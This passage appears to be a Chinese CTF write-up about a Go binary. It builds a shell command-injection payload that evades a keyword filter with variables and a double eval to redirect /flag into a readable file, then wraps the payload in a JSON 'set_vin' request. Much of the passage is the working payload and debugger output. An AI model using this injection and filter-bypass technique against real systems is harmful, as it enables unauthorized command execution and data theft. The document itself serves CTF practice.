变量

函数调用

和传统的各种 stdcall、cdecl、fastcall 等等不同，go 有自己的传参规则，即：ax > bx > cx > di > si > r8 > r9 > r10 > r11。
在 pwndbg 中动调看到的函数调用传参分析是不正确的（但似乎也有方法可以修改？没了解）。

解决

近在咫尺了；只要能够绕过限制，重定向 flag 内容到 /mnt/version 中，就可以读取了。

问了一下 ai，dash shell 中还有 eval 关键词，除此之外这里也没有屏蔽 less。
简单来说就是设置各种各样的变量来绕过上述限制：

o='$'
p='('
q=')'

生成对应的重定向符号 >：

$o$p printf '\\076' $q

注意是两个反斜杠，并且 $p 和 printf 之间要有空格，不然就会识别成 $pprintf 变量。

接下来可能会想着，直接一句话就结束这场战斗的：

o='$'; p='('; q=')'; eval "less /flag ${o}${p}printf '\\076'${q} /mnt/version"

但是失败了，提示：

failed to open '>' for reading: No such file or directory

把重定向符识别成文件了。

怎么解决呢？ai 的解答是这样的：

单次 eval 时，命令替换 $(printf '\076') 生成的 > 不会重新被识别为重定向符。shell 的语法分析发生在命令替换之前，所以 > 只能作为普通参数字符串传给 less，导致 less 把它当成文件名。

需要分为两步 eval，第一步先通过 eval 将变量表达式计算好并放在一个变量里面，第二步再通过 eval 执行该变量。
例如，先计算：

eval "cmd=\"tac ./test.py $o$p printf '\\076' $q ./tmp\""

再执行（双引号可选）：

eval "$cmd"

再将这些命令整合起来，配合上 flag 字符串转为变量就可以读取 flag 了：

f="fla"; g='g'; 
less /$f$g

整合：

f="fla"; g='g'; o='$'; p='('; q=')'; eval "cmd=\"less /$f$g $o$p printf '\\076' $q /mnt/version\"" ; eval $cmd

测试：

# 执行前：
$ cat ./version 
123.456

# 执行后：
$ cat ./version 
test{this_is_a_test_flag_1234567890}

配合上原有的 echo -n %s > /mnt/VIN 添加前后缀：

123 ; f="fla"; g='g'; o='$'; p='('; q=')'; eval "cmd=\"less /$f$g $o$p printf '\\076' $q /mnt/version\"" ; eval $cmd ; echo 123

最终配合上 json，发送的命令应该是：

{"auth": "Bg-Bg-Bg-Bg-", "cmd": "set_vin", "arg": "123 ; f=\"fla\"; g='g'; o='$'; p='('; q=')'; eval \"cmd=\\\"less /$f$g $o$p printf '\\\\076' $q /mnt/version\\\"\" ; eval $cmd ; echo 123"}

执行 sprintf 之后，会发现已经成功将命令写入（此处动调的单引号转义了，是因为本身解析 rax 的内容时也使用了单引号）：

*RAX  0xc00022c0a0 ◂— 'echo -n 123 ; f="fla"; g=\'g\'; o=\'$\'; p=\'(\'; q=\')\'; eval "cmd=\\"less /$f$g $o$p printf \'\\\\076\' $q /mnt/version\\"" ; eval $cmd ; echo 123 > /mnt/VIN'

这里生成 json 也有一些小技巧：
因为手动设置各种双引号是不现实的，非常麻烦，并且 json 不允许 \' 这种转义。所以直接使用一些工具生成会更好。

python3 -c 'import json,sys; print(json.dumps({"auth":"Bg-Bg-Bg-Bg-","cmd":"set_vin","arg":sys.stdin.read()}))' < cmd.sh# 需要提前将刚才的一句话放到 cmd.sh 中
